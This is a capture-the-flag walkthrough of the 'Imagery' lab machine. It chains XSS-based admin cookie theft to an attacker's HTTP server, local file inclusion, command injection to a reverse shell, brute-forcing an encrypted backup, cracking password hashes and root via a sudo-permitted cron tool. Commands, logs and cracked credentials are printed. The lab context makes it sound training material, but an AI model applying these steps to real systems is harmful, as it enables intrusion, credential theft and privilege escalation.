# Imagery

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -p- -sV -sC -T4 imagery.htb  
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-09-28 19:21 EDT
Nmap scan report for imagery.htb (10.10.11.88)
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
|_http-title: Image Gallery
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 32.78 seconds
```

I tried the file upload form but couldn’t get anything out of it

In the source code of the app, we find the following function

```bash
async function submitBugReport(event) {
            event.preventDefault();
            const bugName = document.getElementById('bugName').value.trim();
            const bugDetails = document.getElementById('bugDetails').value.trim();

            try {
                const response = await fetch(`${window.location.origin}/report_bug`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ bugName, bugDetails })
                });
                const data = await response.json();
                if (data.success) {
                    showMessage(data.message, 'success');
                    document.getElementById('bugReportForm').reset();
                    navigateTo('gallery');
                } else {
                    showMessage(data.message, 'error');
                }
            } catch (error) {
                console.error('Bug report submission error:', error);
                showMessage('An unexpected error occurred during bug report submission.', 'error');
            }
        }
```

We craft a request for it with burp as there is no actual button for it. We make an XSS as it says admin review in progress

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FYqxEddzEjhQprXbEa25h%2Fimage.png?alt=media&#x26;token=c5e033e4-d343-4932-94fc-d3ef24aafaf6" alt=""><figcaption></figcaption></figure>

We get a hit for the admin cookie

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (<http://0.0.0.0:1234/>) ...
10.10.11.88 - - [28/Sep/2025 20:23:36] code 404, message File not found
10.10.11.88 - - [28/Sep/2025 20:23:36] "GET /get?cookie=c2Vzc2lvbj0uZUp3OWpiRU9nekFNUlBfRmM0VUVaY3BFUjc0aU1vbExMU1VHeGM2QUVQLU9vcW9kNzkzVDNRbVJkVTk0ekJFY1lMOE00UmxIZUFEcksyWVdjRllxdGVnNTcxUjBFelNXMVJ1cFZhVUM3bzFKdjhhUGVReGhxMkxfcmtIQlRPMmlyVTZjY2FWeWRCOWI0TG9CS3JNdjJ3LmFObGpEdy4yckJ3YjkxWHN3MmYwc21IZlV0NlRWTUpLVW8= HTTP/1.1" 404 -
10.10.11.88 - - [28/Sep/2025 20:24:30] code 404, message File not found
10.10.11.88 - - [28/Sep/2025 20:24:30] "GET /get?cookie=c2Vzc2lvbj0uZUp3OWpiRU9nekFNUlBfRmM0VUVaY3BFUjc0aU1vbExMU1VHeGM2QUVQLU9vcW9kNzkzVDNRbVJkVTk0ekJFY1lMOE00UmxIZUFEcksyWVdjRllxdGVnNTcxUjBFelNXMVJ1cFZhVUM3bzFKdjhhUGVReGhxMkxfcmtIQlRPMmlyVTZjY2FWeWRCOWI0TG9CS3JNdjJ3LmFObGpTdy56LXJ3aV9jSXVEY0xEQURlcnVLQS1IQ2paOGM= HTTP/1.1" 404 -
10.10.11.88 - - [28/Sep/2025 20:25:25] code 404, message File not found
10.10.11.88 - - [28/Sep/2025 20:25:25] "GET /get?cookie=c2Vzc2lvbj0uZUp3OWpiRU9nekFNUlBfRmM0VUVaY3BFUjc0aU1vbExMU1VHeGM2QUVQLU9vcW9kNzkzVDNRbVJkVTk0ekJFY1lMOE00UmxIZUFEcksyWVdjRllxdGVnNTcxUjBFelNXMVJ1cFZhVUM3bzFKdjhhUGVReGhxMkxfcmtIQlRPMmlyVTZjY2FWeWRCOWI0TG9CS3JNdjJ3LmFObGpody5fRVdCSWY0eFVHUzd2YjNiREU4Tm1lcEdxMDA= HTTP/1.1" 404 -
10.10.11.88 - - [28/Sep/2025 20:26:17] code 404, message File not found
10.10.11.88 - - [28/Sep/2025 20:26:17] "GET /get?cookie=c2Vzc2lvbj0uZUp3OWpiRU9nekFNUlBfRmM0VUVaY3BFUjc0aU1vbExMU1VHeGM2QUVQLU9vcW9kNzkzVDNRbVJkVTk0ekJFY1lMOE00UmxIZUFEcksyWVdjRllxdGVnNTcxUjBFelNXMVJ1cFZhVUM3bzFKdjhhUGVReGhxMkxfcmtIQlRPMmlyVTZjY2FWeWRCOWI0TG9CS3JNdjJ3LmFObGp3Zy5wNFZ6ZTQ3SmxXd1k1U2hPbDlidFlSZUNFQm8= HTTP/1.1" 404 -
```

We decode it

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ echo 'c2Vzc2lvbj0uZUp3OWpiRU9nekFNUlBfRmM0VUVaY3BFUjc0aU1vbExMU1VHeGM2QUVQLU9vcW9kNzkzVDNRbVJkVTk0ekJFY1lMOE00UmxIZUFEcksyWVdjRllxdGVnNTcxUjBFelNXMVJ1cFZhVUM3bzFKdjhhUGVReGhxMkxfcmtIQlRPMmlyVTZjY2FWeWRCOWI0TG9CS3JNdjJ3LmFObGpEdy4yckJ3YjkxWHN3MmYwc21IZlV0NlRWTUpLVW8=' | base64 -d  
session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNljDw.2rBwb91Xsw2f0smHfUt6TVMJKUo
```

We pass the cookie in our browser and get access to an admin panel

There is a download log function

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FYTDv0X7QoaRtkG9Oybu0%2Fimage.png?alt=media&#x26;token=7b329a8d-e6ab-4718-a833-2d9ae5b0d64f" alt=""><figcaption></figcaption></figure>

It is vulnerable to LFI

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F8ktt6CeXOxdRgGWTj5pg%2Fimage.png?alt=media&#x26;token=d569ea19-6837-4435-839c-9c38b168c822" alt=""><figcaption></figcaption></figure>

We can read [app.py](http://app.py) and [config.py](http://config.py)

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fx4sw59SyvYXFslEw8zy8%2Fimage.png?alt=media&#x26;token=cbbca572-c684-454a-af77-a0c851a2df69" alt=""><figcaption></figcaption></figure>

In [config.py](http://config.py) we get the path for a db. We get 2 interesting passwords

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FjBEedgpv4Gid3ZwkBTiG%2Fimage.png?alt=media&#x26;token=caa86936-034d-4271-b5d3-25ad27f1802b" alt=""><figcaption></figcaption></figure>

We get the password for [testuser@imagery.htb](mailto:testuser@imagery.htb):iambatman

We can also see [app.py](http://app.py). We see that there are some imports for api. We can also try to include them

/proc/self/cwd is a link to the Current Working Directory !

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FQJ9FCi91I8X2QtGNbupQ%2Fimage.png?alt=media&#x26;token=e11089eb-af1d-43cf-9792-0a6381ee0b99" alt=""><figcaption></figcaption></figure>

Including api\_edit.py, we locate a potential command injection in the /apply\_visual\_transform if the option selected is crop because the option shell=True ⇒ it means that the commands executed here are passed to the /bin/bash shell

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FKnLOIbiSoEtHQxoxMDHg%2Fimage.png?alt=media&#x26;token=23d37313-2dc8-4995-972c-f1428f6db13a" alt=""><figcaption></figcaption></figure>

We can login as testuser and he has the possibility to trigger the image transformation

We upload an image

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FbvJN4hlNcZABRgDoYkGq%2Fimage.png?alt=media&#x26;token=03c81837-de00-4eea-9210-40230463310e" alt=""><figcaption></figcaption></figure>

Tranform the image

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F0CXFGGFj940OOnNgcirG%2Fimage.png?alt=media&#x26;token=87733252-fafd-4e72-9019-384172d6ea30" alt=""><figcaption></figcaption></figure>

We intercept with burp and use command injection. We see here the output of the nc path

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F5SKhVL95wu4KDMKFbKQj%2Fimage.png?alt=media&#x26;token=cf3747f4-0033-423d-9dd6-b8d721c18ee3" alt=""><figcaption></figcaption></figure>

We use it to get a reverse shell

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FMkoMlXpnMvPe6XMRhoHV%2Fimage.png?alt=media&#x26;token=8428f255-98cb-44e2-8efb-f98b76a93300" alt=""><figcaption></figcaption></figure>

We find a backup of the website

```bash
web@Imagery:/var$ cd backup
web@Imagery:/var/backup$ ls 
web_20250806_120723.zip.aes
web@Imagery:/var/backup$ which python3 
/home/web/web/env/bin/python3
web@Imagery:/var/backup$ /home/web/web/env/bin/python3 -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (<http://0.0.0.0:9999/>) ...
10.10.14.217 - - [28/Sep/2025 19:22:06] "GET /web_20250806_120723.zip.aes HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
web@Imagery:/var/backup$
```

We use the following tool to crack the password

[https://github.com/Nabeelcn25/dpyAesCrypt.py](https://github.com/Nabeelcn25/dpyAesCrypt.py)

```bash
┌──(kali㉿kali)-[~/Downloads/dpyAesCrypt.py]
└─$ python3 dpyAesCrypt.py ../web_20250806_120723.zip.aes /usr/share/wordlists/rockyou.txt

[🔐] dpyAesCrypt.py – pyAesCrypt Brute Forcer                                                                                                                                                                                               
                                                                                                                                                                                                                                            
[🔎] Starting brute-force with 10 threads...
[🔄] Progress: ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 0.00% | ETA: 00:00:00 | Tried 0/14344392/home/kali/Downloads/dpyAesCrypt.py/dpyAesCrypt.py:42: DeprecationWarning: inputLength parameter is no longer used, and might be removed in a future version
  pyAesCrypt.decryptStream(fIn, fOut, password.strip(), buffer_size, os.path.getsize(encrypted_file))
[🔄] Progress: ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 0.01% | ETA: 08:25:20 | Tried 1179/14344392

[✅] Password found: bestfriends                                                                                                                                                                                                            
🔓 Decrypt the file now? (y/n): y
/home/kali/Downloads/dpyAesCrypt.py/dpyAesCrypt.py:142: DeprecationWarning: inputLength parameter is no longer used, and might be removed in a future version
  pyAesCrypt.decryptStream(fIn, fOut, cracked_pw, args.buffer, os.path.getsize(args.file))
[📁] File decrypted successfully as: web_20250806_120723.zip
```

We get the password bestfriends and decrypt the file

We unzip it and look at the db.json file and get the password for Mark

```bash
{
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "84e3c804cf1fa14306f26f9f3da177e0",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
```

We crack both

web:spiderweb1234

mark:supersmash

We login as mark

```bash
web@Imagery:/var/backup$ su - mark
Password: 
-bash-5.2$ id 
uid=1002(mark) gid=1002(mark) groups=1002(mark)
```

Check sudo permissions for privesc

```bash
-bash-5.2$ sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

```bash
sudo /usr/local/bin/charcol shell
auto add --schedule "* * * * *" --command "cp /root/root.txt /tmp/a.txt && chmod 777 /tmp/a.txt" --name "copy”
```
